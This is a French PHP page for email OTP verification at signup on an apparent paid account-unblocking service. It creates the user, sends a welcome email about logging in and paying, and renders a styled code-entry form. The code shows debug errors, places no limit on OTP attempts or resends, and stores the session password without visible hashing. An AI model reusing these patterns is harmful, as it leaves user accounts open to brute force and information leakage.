<?php
session_start();
ini_set('display_errors', 1);
error_reporting(E_ALL);
require_once "config.php";
require_once "mail.php";

// Nettoyage et validation de l'adresse email issue de la session
$email = filter_var(trim($_SESSION['register_email'] ?? ''), FILTER_VALIDATE_EMAIL);

if (!$email) {
    header("Location: index.php?page=inscription");
    exit;
}

$error = "";
$success = false;
$success_resend = "";

// ✔ VÉRIFICATION DU CODE OTP
if (isset($_POST['verify'])) {

    if (empty($_SESSION['verify_code']) || empty($_SESSION['code_expire'])) {
        $error = "❌ Session expirée. Veuillez recommencer votre inscription.";
    } else {
        $code = trim($_POST['code']);

        if ($code === (string)$_SESSION['verify_code'] && strtotime($_SESSION['code_expire']) > time()) {

            $check = $pdo->prepare("SELECT id FROM users WHERE email = ?");
            $check->execute([$email]);

            if ($check->fetch()) {
                $error = "❌ Ce compte existe déjà.";
            } else {
                $stmt = $pdo->prepare("
                    INSERT INTO users (
                        email,
                        password,
                        verify_code,
                        code_expire,
                        verified,
                        attempts,
                        created_at
                    ) VALUES (?, ?, NULL, NULL, 1, 0, ?)
                ");

                $stmt->execute([
                    $email,
                    $_SESSION['register_password'],
                    date("Y-m-d H:i:s")
                ]);

                $_SESSION['user_id'] = $pdo->lastInsertId();

                // Contenu du message de bienvenue
                $message = '
<h2 style="color:#6a00ff;text-align:center;">
🎉 Bienvenue sur Ouverture Discussion Support
</h2>

<p>Bonjour,</p>

<p>
Votre compte a été <strong>vérifié avec succès</strong>.
Bienvenue sur notre plateforme.
</p>

<hr>

<h3>📌 Instructions</h3>

<ol>
<li>Connectez-vous avec votre adresse Gmail et votre mot de passe.</li>
<li>Sélectionnez le problème rencontré sur votre compte.</li>
<li>Suivez attentivement les instructions affichées.</li>
<li>Effectuez le paiement uniquement sur la page officielle.</li>
<li>Après confirmation du paiement, attendez la validation automatique.</li>
</ol>

<hr>

<h3>❓ Besoin d’aide ?</h3>

<p>
Si votre compte ne fonctionne toujours pas après la confirmation,
ouvrez la rubrique <strong>Réclamation</strong> et indiquez
l’adresse Gmail utilisée lors de votre inscription.
</p>

<p>
Notre équipe examinera votre demande dans les meilleurs délais.
</p>

<hr>

<h3>⚠️ Sécurité</h3>

<ul>
<li>Ne communiquez jamais votre code de vérification.</li>
<li>Utilisez uniquement cette plateforme officielle.</li>
</ul>

<p style="margin-top:30px;">
Merci de votre confiance.<br>
<b>L’équipe Ouverture Discussion Support</b>
</p>';

                // Envoi de l'email via mail.php
                sendMail(
                    $email,
                    "Bienvenue sur Ouverture Discussion Support",
                    $message
                );

                // Suppression des variables temporaires de session
                unset(
                    $_SESSION['register_email'],
                    $_SESSION['register_password'],
                    $_SESSION['verify_code'],
                    $_SESSION['code_expire']
                );

                $success = true;
            }

        } else {
            $error = "❌ Code incorrect ou expiré.";
        }
    }
}

// 🔁 RENVOYER UN NOUVEAU CODE
if (isset($_POST['resend'])) {

    $newCode = random_int(100000, 999999);

    $_SESSION['verify_code'] = $newCode;
    $_SESSION['code_expire'] = date("Y-m-d H:i:s", time() + 600);

    if (sendMail(
        $email,
        "Nouveau code de vérification",
        "Votre nouveau code de vérification est : " . $newCode
    )) {
        $success_resend = "📧 Un nouveau code a été envoyé.";
    } else {
        $error = "Impossible d'envoyer le code.";
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Vérification OTP</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
        }
        body {
            font-family: 'Arial', sans-serif;
            background-color: #1a0b3d; /* secours si l'image ne charge pas (réseau WebView) */
        }
        /* Wrapper en position:fixed plutôt que body en min-height:100vh + flex :
           certaines WebView Android (conteneur en wrap_content / dans un
           ScrollView côté app native) calculent 100vh sur une hauteur de
           contenu non bornée au lieu de l'écran réel, ce qui décale le
           centrage tout en haut. position:fixed s'ancre sur la fenêtre
           visuelle réelle, ce qui est beaucoup plus fiable en WebView. */
        .page-bg {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            background-image: url("https://deblocagetango.com/tango3.jpg");
            background-position: center;
            background-size: cover;
            background-repeat: no-repeat;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
            padding: 20px 0;
            box-sizing: border-box;
        }
        .card { 
            background: rgba(255,255,255,0.05); 
            backdrop-filter: blur(25px); 
            border: 1px solid rgba(255,255,255,0.1); 
            border-radius: 30px; 
            padding: 40px; 
            text-align: center; 
            color: white; 
            width: 90%; 
            max-width: 400px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
        }
        input { 
            width: 100%; 
            padding: 15px; 
            border-radius: 12px; 
            border: 1px solid rgba(255,255,255,0.1); 
            background: rgba(30,15,50,0.6); 
            color: white; 
            text-align: center; 
            font-size: 20px; 
            letter-spacing: 5px; 
            margin: 20px 0; 
            box-sizing: border-box; 
        }
        .btn-verify { 
            width: 100%; 
            padding: 15px; 
            border-radius: 12px; 
            border: none; 
            background: linear-gradient(90deg, #ff0055 0%, #b000cd 100%); 
            color: white; 
            font-weight: bold; 
            cursor: pointer; 
        }
        .btn-resend { 
            background: transparent; 
            border: 1px solid rgba(255,255,255,0.2); 
            color: white; 
            margin-top: 15px; 
            width: 100%; 
            padding: 12px; 
            border-radius: 12px; 
            cursor: pointer; 
        }
        .timer { 
            font-size: 24px; 
            color: #00f2fe; 
            margin-bottom: 20px; 
        }
    </style>
</head>
<body>
    <div class="page-bg">
    <div class="card">
        <h2>📩 Vérification Email</h2>
        <p style="font-size: 14px; opacity: 0.7;">Code envoyé à :<br><strong><?= htmlspecialchars($email) ?></strong></p>
        <div class="timer" id="timer">10:00</div>
        
        <?php if($error): ?>
            <p style="color:#ff4757;"><?= htmlspecialchars($error) ?></p>
        <?php endif; ?>
        
        <?php if($success_resend): ?>
            <p style="color:#2ed573;"><?= htmlspecialchars($success_resend) ?></p>
        <?php endif; ?>

        <form method="POST">
            <input type="text" name="code" placeholder="000000" maxlength="6" required autocomplete="off">
            <button type="submit" name="verify" class="btn-verify">
                Vérifier
            </button>
        </form>

        <form method="POST">
            <button type="submit" name="resend" class="btn-resend">
                Renvoyer le code
            </button>
        </form>

        <?php if($success): ?>
            <div style="margin-top:20px;padding:15px;background:#00c96b;border-radius:10px;font-weight:bold;">
                ✅ Inscription réussie ! Redirection...
            </div>

            <div style="margin-top:15px;padding:15px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.1);border-radius:10px;color:#ddd;font-size:14px;line-height:1.6;">
                <strong>ℹ️ Si vous ne pouvez pas vous connecter après la confirmation :</strong><br><br>
                Rendez-vous dans la rubrique <strong>Réclamation</strong>, indiquez votre adresse Gmail puis décrivez votre problème.<br><br>
                Notre équipe vérifiera votre compte et vous répondra dans les plus brefs délais.
            </div>

            <script>
            setTimeout(function(){
                window.location.href="index.php?page=dashboard&success=1";
            }, 3000);
            </script>
        <?php endif; ?>
    </div>
    </div>

    <script>
        let time = 600;
        let x = setInterval(() => {
            let m = Math.floor(time/60); 
            let s = time%60;
            document.getElementById("timer").innerHTML = m + ":" + (s < 10 ? "0" : "") + s;
            if (--time < 0) { 
                clearInterval(x); 
                document.getElementById("timer").innerHTML = "Expiré";
            }
        }, 1000);
    </script>
</body>
</html>